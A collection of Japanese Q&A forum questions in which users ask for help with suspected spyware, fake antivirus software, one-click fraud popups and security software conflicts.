パソコンを覗かれているかもしれません。 ここ一年程、パソコン関係のコミュニティや掲示板に出入りしていたのですが、 最近、誰かにパソコンやWeb通信のデータを見られているような感じがするのです。 私の書き込みの後に「覗いているよ」みたいな（かなり遠まわしな・・）書き込みがちょくちょく匿名でされるので、最初は気のせいかと思いましたが、どうも怪しいので質問させて頂きました。 心当たりもいくつかあり、IPアドレスが知られている可能性があることや、一度変なexeファイルをダウンロードさせられたことがあったりで、しかもパソコンに詳しい人ばかりの場所なため、油断ができない状況です。 一応はウイルス対策ソフトやスパイウェアソフト・通信監視ソフト等、フリーで薦められているものは試しましたが、まだ監視されている可能性があります。 こういった監視や盗聴というのは、どの程度まで可能なものなのでしょうか？ また、対策はどうすればいいのでしょうか？ OSは再インストール必須でしょうか？ 正直、気が滅入ってしまっています。 よろしくお願いします。
JS.Downloader.Aqent!IKが見つかりました A-SQUAREDで、Temporary Internet Filesフォルダの、Content.IE5￥8D6DSPOF￥COMMON[2].jsというファイルが、上記（タイトル）のスパイウェアだと見つかりました。 インターネット一時ファイルのようですが、危険性などはどのくらいのものなのでしょうか？ 削除すれば、それで問題は解決するのでしょうか？
有線ルーターでパソコンのセキュリティ セキュリティソフトが入っていない状態のパソコンでインターネットをする場合、ルーターに繋ぐだけでセキュリティは万全でしょうか？ ちなみにOSは、Windows98です。
Infostealer.daonol!genに感染したもようです。 Norton AntiVirus2009で手動検出したところ、 c:￥Documents and Settings￥ユーザー名￥Local Settings内に 0jwmn.tmpというファイルがあって、それが上記のウィルスに感染していると出ました。 クリーニングできず、検疫して削除したのですが このウィルスに感染した場合に行うことはあるでしょうか？ そのファイル自体はまったく記憶がありません。 AntiVirusがウィルスの挙動を止めたということもありません。 分かる方、ご回答をお願いします。
atieclxx.exeについて ふと、タスクマネージャを開き、怪しそうなソフトが無いか見てみました。 すると「atieclxx.exe」というアプリケーションがあったので検索してみたのですが、日本語のサイトが少なく、どのようなアプリケーションなのかわかりません。 もしかしたら、ウィルスかもしれません。 atieclxx.exeについてお分かりになられる方いましたらなんでもいいので教えてください。
今朝PCを起動させると、アンチマルウェア・ドクターなるものがいきなりシステムスキャンをし始めし、その後警告が出ました。 偽物だとすぐにわかったためタスクマネジャーで消しました。 下の１つ目のスクリーンショットをクリックして２枚目のものです： http://www.bleepingcomputer.com/virus-removal/re … 駆除の方法通りrkill.comとマルウェアバイツでのスキャン後感染ファイル等を発見し駆除しましたが、PCを再起動するとまた同じようにアンチマルウェア・ドクターがシステムスキャンをしてしまいます。 マルウェアバイツでスキャンをし、駆除 → 再起動 を数回繰り返しましたが、再起動するたびに、駆除したはずのアンチマルウェア・ドクターが戻ってきます(というか、まだ感染ファイルがPC内に潜んでいる）。 スタートボタン → 検索で、発見した感染ファイルは消しましたがやはり効果なしです。 １．この場合、「システムの復元」で「以前の状態に復元する」と治りますでしょうか？ マルウェアバイツのほかにスパイウェア・ターミネーターもダウンロードしましたが効果なしです。 ２．「マルウェアバイツでスキャン後に駆除」した後に、パスワードを使用して閲覧するサイト（教えてgooやMixi、メッセンジャーなど）を使用しても大丈夫でしょうか？まだ感染ファイルが隠れているのであれば危なさそうなので、今は避けていますが。。
今日始めて見かけないメールが来ていたので 開いて見た所、私のフルネームで○○様２００万当選いたしました。 振込みいたしますので連絡下さい・・・ 詐欺なのはわかりますが何故私の名前を知っているのでしょう？ 何か漏れたのでしようか？あちらは住所まで知っているのでしょうか？ あちらに返信して聞く事も出来ないので困っています。 どおいった所なのでしょうか？何か対策ありませんか？
スパイウェアって何ですか？ ウイルスとはちがいますか？ わかりやすく説明していただけると助かります。 よろしくお願いします。
トロイの木馬について セキュリティソフト「Ad-aware」でスキャンしたところ、「Win32．Trojan.Buzus」というトロイの木馬が検出されました。「TAI」と呼ばれる危険度？は最高の10でスキャン後のアクションは検疫済みとなっています。 このトロイの木馬で何かされた可能性はあるでしょうか？ メモ帳などにあるパスワードなどの情報を盗まれていないでしょうか？ 検疫済みとなっていますが、特に何もせずに安心していいのでしょうか？ 具体的にトロイの木馬は何をするために仕込まれるのでしょうか？ 以前のスキャンでは何も見つかりませんでしたし、スキャン後は危険なサイトなどにアクセスしていませんし、PCすらほとんど起動していません。 オンラインゲームを数時間と、PCゲームを数時間プレイしたのみです。 セキュリティ対策もしていたのになぜ、トロイの木馬が入ってきたのでしょうか？ セキュリティソフトはウィルスバスター2010です。 関係あるかわかりませんが、最近ファイル共有を設定してみました。 その設定が間違っていて、第3者に簡単に入り込まれたという可能性はないでしょうか？
スパイウェアでしょうか? 先ほど中国サイトでQvodという動画再生フリーソフトをインストールしたところ、ツールバーやお気に入りなど、いたる所に中国語のプログラムが表示されるようになりました。 これが噂のスパイウェアか!?と思い、Windows Defenderでフルスキャンしたのですが、特になにも検出されず...また、アンインストールしようにも中国語で書かれていて何がなんだか。対処方法がよくわからないのです。 このまま放置したら、高額請求とかきたりするのか...?など心配です。 初歩的なことなのかもしれませんが、教えてください。よろしくお願いします。
スパムメールについて教えてください。 本日「shtyie.fm」というスパムに引っかかってしまいました。 登録の際にメールアドレスとパスワードを入力したのですが、初めパスワードは 任意かもと思い、本来のメールのパスワードではないものを入れました。 画面が変わらなかったこともあってその後２度目に本当のパスワードを入力してしまいましたが その時は「メールアドレスは他に使われているので変更してください」みたいな警告文でした。 その後、「ホーム」というところをクリックしたら自分が登録されていることを知り、 色々と調べているうちにスパムだと分かったのですが、対処として・・・ 退会手続きをした。（確認のパスワードは１度目のメールパスワードではないものでできた） ウィルスチャックをした。（ウィルス無し） メールパスワードを変えた。 を行いました。 このスパム、どうやらアドレスとメールパスワードを使ってアドレス帳からランダムに 他の人へスパムを送るようですが、上記の対処では無駄でしょうか？ 環境は、PCからソフト「シュリケン」を使って受信しました。 自分にスパムメールが届くのはさておき、他の方に今後迷惑がかからないか心配なので 詳しい方がいらっしゃったら教えてくださるとたすかります。 宜しくお願いします。
セキュリティホールについて 少し前に、ウィルス2010でウィルス検索した結果、「MS10-015」を適用しろみたいなことが書かれていたのでマイクロソフトのHPよりインストールしました。 今になって、心配になり調べてみると、以下のURLに詳細が書かれています。 http://www.microsoft.com/japan/technet/security/ … この内容がよくわからないのですが、この更新プログラムを適用すれば安心していいのでしょうか？ 適用前に、パスワードなどの情報が盗まれてた可能性は、全く無いでしょうか？ それと、上記URLには 推奨する対応策: 自動更新を有効にしている場合、このセキュリティ更新プログラムが自動的にダウンロードされインストールされるため、特別な操作を行う必要はありません。 と書かれていますが、自動更新を有効にしていましたが、自動的にダウンロード、インストールがされていませんでした。 どうしてでしょうか？
親に身分証明書のコピーを送りたいのですが、身分証明書をスキャンしてメールで送り実家で印刷してもらいたいです。 これは危険でしょうか？ 速達でも間に合うかわからないので、メールで送りたいです。
セキュリティを怠っていたため、Data Protection という”偽のウイルス対策ソフト”ウイルスに感染してしまいました。 パソコンに詳しくないため、駆除方法を検索すると、 リカバリするか、正規のウイルス対策ソフトを使って駆除するなどの方法が書かれていました。 いくつか無料のオンライン上の駆除ソフトウエアが紹介されていたので、 「ＡＤ－Aware」といものを試してみましたが、駆除できませんでした。 ＬＡＮにつなぐと個人情報が流出するそうなので、これ以上 いろいろ試すのは不安なので、なにか分かりやすく、必ず駆除できるソフトなどないでしょうか？ ※掲示板にいろいろ対処方が書いてあったのですが、専門的で理解できませんでした。。 ちなみにリカバリしたいのですが、なぜか再インストールしようとすると、 途中で画面が真っ暗になり止まってしまうため、進めません。 ノートンをインストールしようとしても途中でとまってしまい途方にくれています。 なにか解決策がありましたら、よろしくお願い致します。
OSはVistaでセキュリティ対策として今入れているが avast,SpybotS&D,AdーWareSE,SpywareBlaster,ComodoFirewllですがフィッシングとキーロガー対策にいいフリーソフトを教えて下さい。上記のものと一緒に使っても大丈夫のものを。お願いします。
今晩和。 ふといろいろなサイトを回りすぎて、 怪しげな海外サイトに入ってしまいました。 怖くなって、すぐにページは消しましたが、 ウィルスやマルウェア、スパイウェア、レジストリの改ざん （とかいいつつレジストリがなにか把握していませんが・・・） などがちょっと心配です。 （ウィルスバスターを入れていますが、 なんかあまり効果ないって聞いたことがあったので・・・） 今のところＰＣに不調などはありませんが、心配性です。 またパソコン知識がないので、 パソコンが感染してるかどうかもわからないです。 知識がないゆえ、パソコンをリカバリーすれば、 一番手っ取りはやいかなと思い、初期状態にすることを考えています。 パソコンは　IBM　thinkPad G41 リカバリ領域ＨＤ内にあるということはわかったのですが、 肝心のリカバリＣＤの作り方が探しても見当たりません。 作り方を教えていただきたいのと、 （作成する際に）必要なものを教えていただきたいです。 本当、なんにも考えないでぽんぽんリンクとんでしまった、 自分が情けないです（ＴＴ） お力貸してください！！ あと、自分の不安を煽るような事言いますが、 上記以外で怪しい海外サイトにいってしまった際に、 多額請求がくるようなことってありますかね・・・？ すぐ消してしまったのでよくわからないですが、 赤文字で＄マークがいっぱい表示されていたページだったので、 正直びびっています。 よろしくお願いします。
ファイアウォールを導入しようと思っています。環境はWindows7 64bitです。 Windowsには標準でファイアウォールがセットされていますが、興味本位でサードパーティーのファイアウォールを導入しようと思っています。そこで、まずWindows7のファイアウォールでは不十分かどうかご意見を伺ってもよろしいですか？それから、サードパーティーのファイアウォールを導入する場合、Windows標準のファイアウォールと競合する可能性はありますか？サードパーティーのファイアウォールをセットしていれば、Windows標準のファイアウォールは無効にしても大丈夫でしょうか？
スパイスイーパーを削除したい スパイスイーパー（spy　sweeper with anti virus)の更新期限が切れました。 契約を解除したいのに毎日何度も再契約（更新）をせまる画面が出てきます。 他にアンティウィルスソフトを入れているのでスパイスィーパは不要です。削除の方法を教えてください。
付箋（メモ箋人）やメモ帳などにパスワードやIDを記録してデスクトップに置いておくのは危ないでしょうか？ 外部側からは私のPCを触る人はいないので大丈夫だと思うのですが、内部からはウィルスやスパイウェアなどに感染するとやはり危ないでしょうか？ IDは記録せずパスワードのみだと大丈夫ですか？ 良い記録方法が有りましたら教えてください。
復元ソフトを使わないでアダルトサイトの請求画面を簡単に削除する方法を教えてください。 しつこくてこまっています。よろしくお願いします。
システムの復元について なんとかシステムの復元ができたのですが復元できる日付が前日までです。 さかのぼった日付で復元したいのですが、方法がわかりません。どうぞ教えてください。
ウィルス対策ソフトの評価(検出率、軽さ等)を参考にしてeset smart securityを使っていたのですが、 windwos7を先々月購入した際にnorton2009の体験版が入っていたのでしばらく使っていました。 体験版の利用期限が近くなったのでnortton2009を外して、eset smart securityを昨日インストールしたの ですが、それ以来メールの受信速度やブラウザでサイトを開く速度が遅くなったような気がします。 ブラウザのダウンロードの速度は実際遅くなっているかどうかは判断しにくいですが、メールの 受信速度は明らかに遅くなっているようです。eset smart securityを無効にして(ウィルス、スパイウェア対策機能及びファイアーウォール)受信を行っても 速度は遅いです。何が原因でしょうか？eset smart securityの影響でしょうか？ フリーでも検出率が高く軽いソフト(avast等)もあるようなのでそれらの利用も考えていますが、 eset smart securityの利用期限がまだ残っていたのでインストールしたのですが、 それの影響でしょうか？ どなたかお分かりの方がいらっしゃいましたら回答の程宜しくお願いします。
スパイ・マルウェアソフトについて質問します。 現在、非常駐で SpywereBlaster 、Spybot、Ad-Awareを使っています。 Spybotはを起動させると次の製品を検出しました。この製品と共存させると競合する可能性がありますと表示されます。競合対象製品はAd-Awareです。 Spybotはインストールの時にSDHelperとTeaTimerのチェックを外してインストールしたつもりです。 ツールの常駐保護の状態のチェックは外れています。 Ad-AwareもAd-Watch Liveをオフにしています。 この状態でも競合は起きてしまうものなのでしょうか？ よろしくお願いします。
迷惑メールの配信拒否を開いてしまいました。 その後このメールは沈黙しました。 これは、目的を達した（たとえば個人情報を入手した、何らかのスパイウェアのようなものを送りこめた）ためかと不安になっています。 もちろん開いただけです。 配信拒否画面ではなかったので、あわてて閉じました。 怖くなって、ウイルスバスター２０１０に加えプロバイダーでの迷惑メール受信拒否をしました。 ウイルスバスターの個人情報保護も有効にしました。 今、何が起きているでしょうか。不安です。 介護で外出がままならないため、ネットバンキング、ホームトレイドショッピングなどお金に絡むことでもＰＣを利用しています。 パスワードの変更など、何らかの対処が必要でしょうか。 初心者のくせに、安易にいろいろ利用しております。 ないが起きているのか、どうしたら良いのかお教えください。 お願いいたします。 ちなみにＷｉｎｄｏｕｗｚＶｉｓｔａを使っています。
家族のノートPCを借りて使用していたら、詐欺的セキュリティソフトに感染してしまったようです。 とりあえず今はそちらのPCの電源を落とし、持ち主が帰宅してからどうしてこのような事態になったのか、説明してなんとか修復を試みたいと思っています。普段と変わったことや怪しいサイトなど見ていず、普段利用しているサイトを閲覧していただけなのですが・・・。このような現象が起こる原因がお分かりの方、教えてください！
恥ずかしい話ですが、アダルトサイトにワンクリックしたところ、”登録ありがとうございました。３日以内に５００００円振り込んでください”と画面にでてきました。あせってしまった私は、サポートセンターが定休日とありましたが、家の電話から電話をしてしまいました。もちろん、相手は、不在でした。家の住所や名前など個人情報がもれてしまったんじゃないかと心配です。又、電話が掛かってこないか心配です。電話をしてから、２日経っていますが、今のところ、電話はありません。お金は、振り込んでいませんが、大丈夫でしょうか？
セキュリティーソフトの詐欺行為で困っています。 本日、誤ってセキュリティーソフトをダウンロードしてしまいました。その後、IEやメールをするたびにそのソフトを購入するようにというメッセージが出てきて満足にアクセスできません。 （名前はデスクトップセキュリティー２０１０です。） また、エクセルやワードは立ちあげて画面が開くと瞬時に警告メッセージページと変わり、まったく使うことができません。 マイクロソフトのコールセンターで相談したところそれは詐欺行為でありウィルスと同じなのでインストールしているセキュリティーソフト会社のコールセンターへ電話して駆除の方法を聞くようにとのことでした。しかし、明日・明後日は休日なので何とか対策を練りたいと思います。 こちらのPCはWin8 xpです。 このソフトはメールに添付されてきたもので英文です。見た目はマイクロソフトのデザインと似ており、マイクロソフトからのアップデートなのかと勘違いさせるやり方で何度も送られてきました。 宜しくお願いいたします。
Hなサイト見ていてうっかりサーフィンしててクリックしてしまったら ご入会手続きが完了しました、料金をお支払いください というメッセージがデスクトップに出てきて シカトしてたら数十秒おきにデスクトップに同じようなメッセージが出てきてしまって 困っています。氏名もメールアドレスも住所も携帯番号も入力していないので 未だにシカトしていますがこのメッセージが頻繁に出てきます。 タスクマネージャーでタスクの終了も出来ません。 初期化するしかないのでしょうか？ よろしくお願い致します。
紙媒体に印刷された文字をWordに入力したいのですが、 タイピングが得意でないために困っています。 デジカメで撮影した写真から文字を取り込んでくれるようなソフトはないでしょうか？ どなたかご存知でしたらよろしくお願いします。
Ad-awareをアンインストールしたい コントロールパネルのプログラムの追加と削除から削除しようとしても、「削除」ボタンが表示されない。 スタートメニュー内の「Ad-awareをアンインストールする」からアクセス ↓ 「Ad-awareの旧バージョンをアンインストールできません この製品のインストール元を利用できません、インストール元が存在し、アクセス出来ることを確認して下さい。」と表示されてアンインストールできない。 （たまに「Ad-AwareInstallation.msi」と言うファイルを指定することもあるが、このファイルはどこにもありませんでした。） 公式サイトからダウンロードしたソフトを上書きインストールしてみたが、症状は変わりませんでした。 この状態で止まっています。 どうすればいいか教えてください。 よろしくお願いします。
　トレンドバスター2009年版のインストールに附いて御存知の方わいらっしゃいませんか? 2009年版インストールを行いたいのですが、使用しているPCのwindows7に2009年版をインストール出来るでしょうか? 御存知の方で、良識をお教え下さる方わいらっしゃいませんか?
かなり危険なスパイウェアが検出されました… 少し前にあるアダルトサイトにてワンクリックウェアに引っかかり、htaファイルをダウンロードしてしまいました。すぐにシステムの復元を行い、料金請求などのポップアップはなくなり、ウイルスソフトのGDATAでウイルス検索を行い何も発見されませんでしたが、PCの調子が若干悪くなってきていたこともあり、一応OSの再インストールを行いました。 その際、一応ウイルスバスターのオンラインスキャンでウイルス検索を行いました。すると「SPYWARE_TRAK_WINVESTIGATOR」というスパイウェアが見つかりました。しかし、どうせまたクッキーかなにかだろうと思い、そのときはそのままOSの再インストールを行いました。 そしてHDDもフォーマットし、無事再インストールが終了し、GDATAを入れ、windows updateも行い、少しネットサーフィンをした後、気分でウイルスバスターのオンラインスキャンを行うと、また「SPYWARE_TRAK_WINVESTIGATOR」というスパイウェアが発見されました。 これは何かあると思い、ネットで調べてみるとかなり危険なスパイウェアであることが分かりました。しかし、GDATAでは何も発見されず、ましてやOSの再インストールを行ったあとも見つかるとはいったいどういうことなのでしょうか？またOS再インストールは昨日行ったばかりで、特に怪しいページなどにも行っておりません。 PCのスペックは下記の通りです。 OS:Windows XP Professional SP3 PCは自作です。 よろしくお願いします。
ウイルスバスター2010のアップデートが進行せず困っています。 手動でアップデートを始めましたところ、 　1.アップデートに接続しています 　2.ファイルをダウンロードしています 　3.ファイルをインストールしています 　４.ファイルを適用しています 　の4段階の1から先に進行しません。進行状況をしめす0～100％グラフも0％のままです。 　解決法がありましたら、ご教授ください。
パソコンが不正アクセスされています…よければ助けて下さい。 パソコンに余り詳しくないのですが、WindowXPでパソコンの動作が遅い為、メモリ不足かと思いタスクマネージャでプロセスタブの、ユーザー名の所を見たところ知らないユーザー名が３つありました。 NTTのセキュリティツールで無線LANパトロールをしたところ知らないユーザーが何件か見つかり 家族で私以外にパソコンを使っている者はおらず、外部から侵入され知らない誰かが、勝手に使っているのではと思い、対策はないか調べたのですが…調べ方が悪いのか中々出てこず。 業者を呼ぼうかと思ったのですが、何処の業者に来てもらえばいいか分からずで、挙げ句現在怖くてパソコンが開けません。 良ければPCに詳しい方対策等教えて欲しいです 知らないユーザー名があったパソコンは… 富士通の一体型PCでこれが主に使っているPCです。 最近は一年前に買った無線LAN内臓のエーサーのミニノートPCを使っています。ミニノートは無線LANはしておらず、有線で接続し無線LANは無効にしている状況です。 長々となりましたがよろしくお願いします。では乱文失礼します。
ワンクリック詐欺とみられる被害にあってしまい、hijackthisというツールで駆除しようと試みているのですが、パソコンが苦手なものでどれがfixすべきファイルか分からず困っています。 下の名前のなかで削除すべきものがおわかりの方がいらっしゃいましたら、ぜひ教えてください。 Logfile of Trend Micro HijackThis v2.0.2 Scan saved at 7:18:44, on 2010/05/04 Platform: Windows XP SP3 (WinNT 5.01.2600) MSIE: Internet Explorer v8.00 (8.00.6001.18702) Boot mode: Normal Running processes: C:\WINDOWS\System32\smss.exe C:\WINDOWS\system32\winlogon.exe C:\WINDOWS\system32\services.exe C:\WINDOWS\system32\lsass.exe C:\WINDOWS\system32\svchost.exe C:\WINDOWS\System32\svchost.exe C:\WINDOWS\Explorer.EXE C:\WINDOWS\system32\spoolsv.exe C:\Program Files\Apoint2K\Apoint.exe C:\Program Files\Fujitsu\IndicatorUtility\IndicatorUty.exe C:\Program Files\Fujitsu\Fujitsu Quick Touch\QuickTouch.exe C:\Program Files\Fujitsu\BtnHnd\BtnHnd.exe C:\Program Files\Fujitsu\PowerUtility\schedule\PUSCDaemon.exe C:\WINDOWS\System32\ezSP_Px.exe C:\Program Files\Apoint2K\ApMsgFwd.exe C:\Program Files\Fujitsu\chitose\updatenv.exe C:\WINDOWS\AGRSMMSG.exe C:\Program Files\Apoint2K\HidFind.exe C:\WINDOWS\system32\hkcmd.exe C:\Program Files\Apoint2K\Apntex.exe C:\WINDOWS\system32\igfxpers.exe C:\WINDOWS\system32\conime.exe C:\Program Files\Canon\MyPrinter\BJMyPrt.exe C:\Program Files\Common Files\Java\Java Update\jusched.exe C:\WINDOWS\system32\ctfmon.exe C:\Program Files\Messenger\MSMSGS.EXE C:\Program Files\Google\GoogleToolbarNotifier\GoogleToolbarNotifier.exe C:\Program Files\DAEMON Tools Lite\DTLite.exe C:\Documents and Settings\Owner\Local Settings\Application Data\Google\Update\1.2.183.23\GoogleCrashHandler.exe C:\Program Files\Bonjour\mDNSResponder.exe C:\Program Files\Justsystem\JSLIB32\JSQSF32.EXE C:\Program Files\Canon\IJPLM\IJPLMSVC.EXE C:\Program Files\Java\jre6\bin\jqs.exe C:\Program Files\Common Files\Microsoft Shared\VS7DEBUG\MDM.EXE C:\Program Files\Fujitsu\sa\bin\mpbtn.exe C:\Program Files\Norton AntiVirus\Norton AntiVirus\Engine\17.6.0.32\ccSvcHst.exe C:\Program Files\Fujitsu\sa\de\jsharp\bin\SBRSVC.EXE 載らなかったのですみません、2通目に続きます
McAfeeのエラー「12152」の解決策を教えてください。 私はMcAfeeのセキュリティソフトのダウンロード操作をしました。そしてダウンロードしている最中に、以前使用していたNortonのプログラムのアンインストールを行いました。 すると、McAfeeのダウンロードが途中で終了してしまいました。それ以降、McAfeeのアップデート表示が消えてしまったり、ダウンロードの操作がユーザーアカウント制御までで止まってしまい、ダウンロードマネージャが起動しない状態になってしまいました。 どうすればいいのか困ってしまいました。McAfee Virtual Technicianで診断したところ、「McAfeeサーバからファイルをダウンロードできません。」という問題がありました。宜しくお願いいたします。
手動でウイルスバスターの検索をしたところ COOKIE_GO というクッキーが見つかりました。 クッキーだから大丈夫かなと思ったのですが念のためトレンドマイクロの詳細を見たところ、情報漏えいの危険性という項目が高になっていました。 どこかに個人情報が漏れてしまったのでしょうか？ 不安になっています…。
TCSTARTの削除法、フリーズの原因 トロイにかかり、トロイの原因がおそらくTCSTARTではないかというところまでわかったのですが、 ウイルス、スパイウェア駆除ソフトが感知してくれずどう削除して良いか悩んでいます 現在入れているソフトはaviraとspybotで更新はしています システム構成ユーティリティでスタートアップからは外しているのですが、 あるだけでもあまり良い気分で無いので、削除する方法を教えていただければと思います もう一つ問題があって、近頃PCが断続的にフリーズする現象が一週間に一回程度起こります 基本的にネットに繋いでいるだけなのですが、 挙動が重たくなった後に1,2分ほどフリーズ(カーソルは動きます)、1分程度通常に戻るを繰り返すというのが一度電源を落とすまで続きます 今のところ電源を落とせば完全に復活はします 重たいページや動画など大きな負荷をかけることをするとなるようなのですが、詳しい原因がわかりません HDDの寿命ならば電源を落としても復活しないと思うので、ソフトウェアに問題があるのかもしれないと考えています 原因がわかる方がいれば教えていただきたいです
Spybot-S＆Dの免疫について Spybot-S＆Dの免疫機能ってSpybotのメイン画面を閉じても持続されるんですか？
恥かしい話ですが、 俗に言うワンクリック詐欺のポップアップが消せなくて困っています。 消し方を調べてみたら、私と全く同じホームページから数日前に同じように被害に遭った方がいたようで、その解決法を参考にしたのですが↓ http://detail.chiebukuro.yahoo.co.jp/qa/question … ↑で、回答者のあげている「ワンクリウェア駆除ツール」のホームページに飛びたいのですが、何時に行っても 「呼び出されたURLの表示は拒否されました(403」 と表示された後インフォシークのTOPページに移動してしまい、目的のＨＰに行くことが出来ません。 理由が分かる方、いらっしゃいますか？ また、他の方法で消し方をご存知の方がいましたらどうかご教授下さい。 自分でも駆除方を調べてSpybotを使ってみたのですが、特に何も検出されませんでした。 現在使っているノートンからも何も検出されませんでした。 ちなみに、そのアダルトサイトで私が実行してしまったファイルは 「mshta.exe」というもののようです。
avast!のリアルタイムシールドとSpybot-S＆Dの免疫って相性は合いますか？
ワンクリウェア駆除ツールというソフトフェアがダウンロードできる場所を教えてください。
PCの画面の右下のツールバーに見覚えの無いアンチウィルスソフトのアイコンが出現しました。 出現してから何度もセキュリティーのアラートを呼びかけますし、フォルダを開くなど、１つ１つの行動にSecurity Warningと反応します。 勝手にそのソフトの画面や、変なサイトが何もない状態からいきなり立ち上がったりします。 また、インターネットエクスプローラを立ち上げても、Internet Explorer Warningの画面しか出てきません。 おかしいと感じ、AVGのフリーソフトでスキャンをすると、Adware.CnsMinが検出され、常駐シールドではトロイの木馬が検出されていました。 スキャンの後、Adware.CnsMinを削除しようとしても出来ずに、何度も検出されます。 自分がパソコンの知識がほとんど無いこともあり、この様な場合、どうすれば良いのか分からなく、インターネットもできずに困っています。 どの様な対処をすれば良いのか是非ご回答をお願いします。 パソコンはvistaです。
いつの間にかインストールされていた"jword"というプログラムがあり、気味が悪いのでコントロールパネルからアンインストールしたのですが、その直後から、 Google Chromeを起動すると、エラー 102 (net::ERR_CONNECTION_REFUSED): 不明なエラーですと表示され、 IEでは Internet Explorer ではこのページは表示できませんと表示され、「接続の問題を診断」、「詳細情報」をクリックしても反応がありません。 なぜかFirefoxではブラウジングすることができています。 アンチウイルスソフトの停止、Chrome、IEの許可、 Windowsファイアウォールの無効化、 マルウェアのチェック、 プロキシの設定をしなおす、 すべてのCookie の削除、 Chrome、IEの再インストール などを試してみましたが、状況は変わりありません。 環境はWinXP Home SP3です。 どうしたらよいものか困っています。対処方法をご教示いただけませんでしょうか。
いきなり英語サイトがI.Eで立ち上がり、特に被害はありませんが、気持ちが悪い状態です。 スパイウェアが入ったのかな？と思い、ネット情報で効果的だと言われてたAd-Awareというソフトを見つけ、使いましたが、特に以上は見つかりませんでした。 同じような状況のかた、もしくは解決法をご存知の方、アドバイスいただけたらと思います。 ちなみにOSは、windowsXPです。
Windows Defender でスキャンしようとすると無効設定をしたおぼえもないのに（無効に設定する方法さえ知りません。）毎回　「Windows Defender が無効になっています。危険です。」　というようなメッセージが表示されます。　いちいち　「有効」　にするのが面倒です。　この表示が出ないように常に有効にしておきたいのですが、その方法をご教授くださいませんか。　　　
不要なソフトをアンインストールしていたところ gotoassistというソフトが入っていたのですがこれはどういったソフトなんでしょうか？ 他人に勝手にパソコン内の情報を見られるとった危険性はありますか？
セキュリティソフトはひつようですか？　今、ADSLを入れてますが、「光」にしてもセキュリティソフトは必要でしょうか。チラシには、「安心のセキュリティ機能」と言った文字があります。「ウイルス対策」「プライバシー情報保護」など書かれてますがそれでも必要なのでしょうか
XPProSP3とWim7Home（32bit)のデュアルブートで、KDDIひかりone, ルーター（AtermBL190HW)使用。XPにはNortonAntiVirus(SystemWorks2005),SpyBot,AdAwareを入れてます。Win7にはMicrosoftSecurityEssentialsのみです。先日Win7にGoogleChromeをインストールした際、NortonSecurityScanが一緒に入り、試しにscanしましたら、44個の脅威が見つかり、全てTrackingCookiesでした。MSEはスパイウェア対策も出来てると思ってたのですが不十分でしょうか？ 又入れるとしたら、SpyBot,AdAware以外に、フリーで7対応のスパイウェア対策はどのようなものが在るでしょうか？ どうぞ宜しくご教示下さい。
security toolというマルウェアに感染してしまったため、他サイトにあったrkill→Malwarebytes' Anti-Malware実行という手順で削除しようと思ったのですが、Malwarebytes' Anti-Malwareでスキャンを実行すると、二時間ほどで「問題があったためスキャンを中断しました」というような表示が出てしまい、スキャンがキャンセルされてしまいます…。 「問題の詳細を確認する」をクリックすると、以下のような表示がされるのですが、パソコン関係に全く詳しくないため、どうすればよいのかさっぱりわかりません…。 詳しい方がいらっしゃいましたら、どうか回答をお願い致します。 問題の署名: 問題イベント名:APPCRASH アプリケーション名:mbam.exe アプリケーションのバージョン:1.45.0.0 アプリケーションのタイムスタンプ:4bb10678 障害モジュールの名前:USER32.dll 障害モジュールのバージョン:6.0.6002.18005 障害モジュールのタイムスタンプ:49e0380e 例外コード:c0000005 例外オフセット:000121dc OS バージョン:6.0.6002.2.2.0.768.2 ロケール ID:1041 追加情報 1:cc77 追加情報 2:ef1a5c26c968aa33f0b7c9bb536b7677 追加情報 3:94cd 追加情報 4:fdfe331f4bcd3385cb228314a1b8cbea
ワンクリック詐欺に掛かってしまい　常時請求の画面がでてしまいます　どのようにすれば　解決できるのでしょうか・・・・よろしくお願いします
最近　RON ads by Profitharbor　というウィンドウが開き、各種広告が表示されるようになって困っています。スパイウェアに類するものかと思うのですが、Ad-AwareやAdvanced SystemCare でスキャンしても改善されません。どうしたらいいのでしょうか。
迷惑メールに付いて、 迷惑メールが、沢山来ます。メッセージルールで仕分けは出来てますが、来る元は、一か所の同一のアドレスなんですが、防ぐ方法は無いでしょうか？
Ad-Awareの常駐をしていますか？ 何かでAd-Awareは常駐しない方がいいと書いてあったので。。。 ご意見よろしくお願いします。
ウイルスバスターとの相性 ウイルスバスターとSpybot-Search&Destroyの相性って合いますか？
デスクトップ画面に有料サイトの請求画面が残る 有料サイトにアクセスしているうちに請求画面が出たので無視しましたが、インターネットにアクセスすると請求画面が出てきて消すことができません。どのような手続きをしたらよいのですか？
３日程前から私の事務所のパソコンにアダルトサイトのスパム表示が2～3分置きに以下のようなメッセージが表示されます 「入会手続きが完了しました、お支払い期限残りは00時間00分00秒です」とカウントダウンで表示され、その期限が過ぎた後はお支払い期限が過ぎております、と同じ様な間隔で表示され全く仕事になりません セキュリティソフトでスキャンかけますが認識しません どのように対処したら解決するか教えてください 非常に困っています、よろしくお願い致します
AceSpyと言うスパイウェアが検出されました。 http://www.shareedge.com/spywareguide/product_sh … を見ると > 手動での削除: AceSpyをアンインストールするには、スタート/実行で"参照"をクリックしWindowsディレクトリに移動し"System32"をクリックします。 > "AceSpy"をダブルクリックし、"uninst000" または > "uninstall" をダブルクリックします。OKをクリックするとアンンストールが開始されます。 > プログラムの指示に従ってシステムを再起動するとAceSpyはご使用のシステムから削除されます。 とあるのですが、"System32"フォルダ内には、AceSpyと言うファイルは見当たりません。 どの様にすれば削除できるのでしょうか？
スパイウェア　ウイルス、submitwolf検索エンジン登録プログラムは、ウイルス、または、スパイウエアです。使用すると画面が色ぐもりして、文字がダブります。撤去の仕方を教えてください？www.trellian.jp/jp/index.html EasyTouroku v6.0（SubmitWolf）
ウィニーなどの共有ファイルは使用してませんがウイルスやスパイウェアにより動画の流出はありえますか？ (1)ＰＣでＤＶＤ-Ｒを再生（ウインドウズメディアプレーヤー）で再生　中ウイルスやスパイウェアなどが感染していれば内容までもっていか　れますか？ (2)ＰＣでＤＶＤ-Ｒを再生（ウインドウズメディアプレーヤー）した場　合履歴が残るとの事ですがこの場合の履歴とは内容まで残る の です　か？それともタイトルなどだけが残るのですか？ (3)もし仮に内容など残らないとしてもウイルスなどの感染によりその履　歴のファイル？が流出した場合、内容まで復元できたりす る のでし　ょうか？ (4)また上記のように共有ソフトを使用していなくてもウイルスによりプ　ライベートな動画が流出した事例は過去にあるのでしょうか？ 　つまりはプライベートな内容のＤＶＤをＰＣで1,2度再生しただけで　も流出の可能性はあるのでしょうか？ネットワークに接続している以　上ゼロでないのはわかりますが詳しい方専門的アドバイスお願いします。
